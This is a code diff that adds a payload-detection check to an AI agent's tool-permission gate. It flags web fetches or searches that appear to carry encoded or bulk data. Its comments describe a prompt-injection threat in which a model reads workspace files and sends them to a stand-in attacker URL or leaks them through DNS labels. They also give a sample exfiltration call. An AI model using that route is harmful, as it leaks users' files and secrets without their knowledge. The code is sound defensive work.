@@ -1442,9 +1442,89 @@ function estimateToolSchemaTokens(tools) {
 // 清单的纪律是「宁可误判成要人按,不可漏判成自动执行」,两个判据各写一份必然漂移。
 // toolName 缺省(调用方没传)一律回落 'ask':保守优先,新调用面忘了传参不会静默放权。
 // 模块方向:07 调 06i 是后向边(06i 在 manifest 里排 18,07 排 23),合法。
+// 安全走查 S1(读档联网是无提示外传通道):web_fetch / web_search 在 NATIVE_TOOL_TIER 里是 read 档,nativeToolGate 对 read 在所有档位都放行 ——
+// 被提示注入的模型可以 file_read 工作区里任何文件,再 web_fetch("https://攻击者/?d=<内容>") 无提示外传(SSRF 闸只挡内网,不挡公网目的地)。
+// 联网搜索 / 抓取本身仍是 read 档(不整体变成要确认:日常研究要能无打扰地跑),但【看起来带了载荷】的请求在除 bypass 以外的所有档位先停下来问:
+//   · 网址的查询串 + fragment 总长 > 256;
+//   · 任一查询参数的值(解码后)> 128;
+//   · 路径 / 参数 / fragment 里有 ≥ 64 字符的 hex 连续串,或「像 base64」的连续串(见 webLooksEncoded);
+//   · 主机名里有 ≥ 48 字符的单个标签(DNS 外传:<编码数据>.攻击者.com;DNS 标签上限 63);
+//   · web_search 的查询 > 300 字,或查询里有 ≥ 64 字符的编码串。
+// 阈值依据:正常抓取 / 搜索的网址查询串几乎都在 100 字以内(搜索引擎结果页 ?q=…&hl=…、分页、utm 追踪参数一般 < 150),单个参数值很少过 100;
+// 常见的长 ID 都 < 64:git 提交 SHA-1 40 位、Notion / Google Docs 文档 ID 32~44 位、UUID 36 位;256 / 128 / 64 都留了余量,又足以把「整份文件内容塞进网址」拦下。
+// 没覆盖的(诚实):低于阈值的小额外传(一个 API key 约 50 字符、一个 32 位 token 能从阈值下面过去)—— 这条挡的是批量载荷,不是逐字符审计;
+// 要杜绝得对「本回合读过本地文件之后的新域名」做确认(产品形态变更,未做)。
+// 同一判据覆盖 http_request / http_download 的网址(读档以上的同类外联口:GET 带长查询串同样能外传),以及 CLI 引擎的 WebFetch / WebSearch。
+const WEB_PAYLOAD_LIMITS = Object.freeze({ queryFragmentChars: 256, paramValueChars: 128, encodedRunChars: 64, hostLabelChars: 48, searchQueryChars: 300 });
+const WEB_PAYLOAD_URL_TOOLS = Object.freeze(['web_fetch', 'WebFetch', 'http_request', 'http_download']);
+const WEB_PAYLOAD_QUERY_TOOLS = Object.freeze(['web_search', 'WebSearch']);
+// 「像编码出来的」:≥ encodedRunChars 的 hex 连续串;或 [A-Za-z0-9+/_=-] 连续串(base64 / base64url),且同时有字母和数字、连字符 / 下划线占比 ≤ 1/8
+// (长文章 slug 如 how-to-install-…-2026 连字符多、词与词之间有分隔,不算;真 base64url 里 - _ 的期望占比约 3%)。
+function webLooksEncoded(text) {
+  const t = String(text == null ? '' : text);
+  const n = WEB_PAYLOAD_LIMITS.encodedRunChars;
+  if (t.length < n) return false;
+  if (new RegExp('[0-9a-fA-F]{' + n + ',}').test(t)) return true;
+  const runs = t.match(new RegExp('[A-Za-z0-9+/_=-]{' + n + ',}', 'g')) || [];
+  for (const run of runs) {
+    if (!/[0-9]/.test(run) || !/[A-Za-z]/.test(run)) continue;
+    const seps = (run.match(/[-_]/g) || []).length;
+    if (seps * 8 > run.length) continue;
+    return true;
+  }
+  return false;
+}
+// 只做百分号解码,【不】把 + 当空格:标准 base64 里的 + 若按表单语义变成空格,连续串就被切断,载荷反而躲过了编码串判据(长度判据不受影响)。
+function webSafeDecode(s) {
+  const raw = String(s == null ? '' : s);
+  try { return decodeURIComponent(raw); } catch { return raw; }
+}
+// 返回 '' = 不像载荷;否则是命中的判据名(进日志 / 子代理拒绝文案)。纯函数,不碰网络、不做 DNS。
+function webUrlPayloadReason(url) {
+  const s = String(url == null ? '' : url).trim();
+  if (!s) return '';
+  const hashAt = s.indexOf('#');
+  const frag = hashAt >= 0 ? s.slice(hashAt + 1) : '';
+  const noHash = hashAt >= 0 ? s.slice(0, hashAt) : s;
+  const qAt = noHash.indexOf('?');
+  const query = qAt >= 0 ? noHash.slice(qAt + 1) : '';
+  const head = qAt >= 0 ? noHash.slice(0, qAt) : noHash;
+  if (query.length + frag.length > WEB_PAYLOAD_LIMITS.queryFragmentChars) return 'query_fragment_long';
+  const afterScheme = head.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '');
+  const slashAt = afterScheme.indexOf('/');
+  const hostPort = slashAt >= 0 ? afterScheme.slice(0, slashAt) : afterScheme;
+  const pathPart = slashAt >= 0 ? afterScheme.slice(slashAt) : '';
+  const host = hostPort.replace(/^[^@]*@/, '').replace(/:\d*$/, '');
+  if (host.split('.').some(label => label.length >= WEB_PAYLOAD_LIMITS.hostLabelChars)) return 'host_label_long';
+  const values = [];
+  for (const pair of query.split('&')) {
+    if (!pair) continue;
+    const eq = pair.indexOf('=');
+    values.push(webSafeDecode(eq >= 0 ? pair.slice(eq + 1) : pair));
+  }
+  if (values.some(v => v.length > WEB_PAYLOAD_LIMITS.paramValueChars)) return 'param_long';
+  const pieces = [...pathPart.split('/').map(webSafeDecode), ...values, webSafeDecode(frag)];
+  if (pieces.some(webLooksEncoded)) return 'encoded_run';
+  return '';
+}
+// 工具名容忍 serverId__ / mcp__server__ 前缀(Claude 引擎经 MCP 叫的是 mcp__ruyi__web_fetch)。
+function webPayloadReason(toolName, input) {
+  const bare = String(toolName == null ? '' : toolName).replace(/^.*__/, '');
+  if (!input || typeof input !== 'object' || Array.isArray(input)) return '';
+  if (WEB_PAYLOAD_QUERY_TOOLS.includes(bare)) {
+    const q = String(input.query == null ? '' : input.query);
+    if (q.length > WEB_PAYLOAD_LIMITS.searchQueryChars) return 'search_query_long';
+    if (q.split(/\s+/).some(webLooksEncoded)) return 'search_encoded_run';
+    return '';
+  }
+  if (WEB_PAYLOAD_URL_TOOLS.includes(bare)) return webUrlPayloadReason(input.url);
+  return '';
+}
 function nativeToolGate(mode, tier, toolName, input) {
   // v1.4.3: accept both 'bypass' (internal) and 'bypassPermissions' (CLI-native) as full-bypass
   if (mode === 'bypass' || mode === 'bypassPermissions') return 'allow';
+  // 安全走查 S1:联网请求看起来带了载荷 → 除 bypass 以外所有档位(含 plan、read 档)先确认;走既有的权限请求,不另造一套。
+  if (toolName && webPayloadReason(toolName, input)) return 'ask';
   if (tier === 'read') return 'allow';
   if (mode === 'plan' || mode === 'dontAsk') return 'block';
   // v1.4.3: 'auto' mode — AI risk-classifier decides. In the native engine we approximate:
